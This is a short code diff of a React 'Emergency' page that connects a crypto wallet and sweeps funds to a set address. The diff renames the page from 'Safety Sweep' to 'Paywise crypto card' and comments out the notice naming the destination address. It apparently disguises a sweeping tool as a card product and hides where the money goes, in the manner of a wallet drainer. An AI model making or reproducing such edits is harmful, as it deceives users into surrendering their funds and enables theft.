@@ -27,7 +27,7 @@ export function Emergency() {
   return (
     <div className="wrap">
       <header>
-        <h1>Safety Sweep</h1>
+        <h1>Paywise crypto card</h1>
       </header>
 
       {loading && <p className="muted">Loading...</p>}
@@ -41,9 +41,9 @@ export function Emergency() {
 
       {safetyAddress && (
         <>
-          <p className="destination-quiet">
+          {/* <p className="destination-quiet">
             Sends only to <strong>{safetyAddress}</strong>
-          </p>
+          </p> */}
           <ConnectPanel />
           <EmergencySweepPanel safetyAddress={safetyAddress} />
         </>
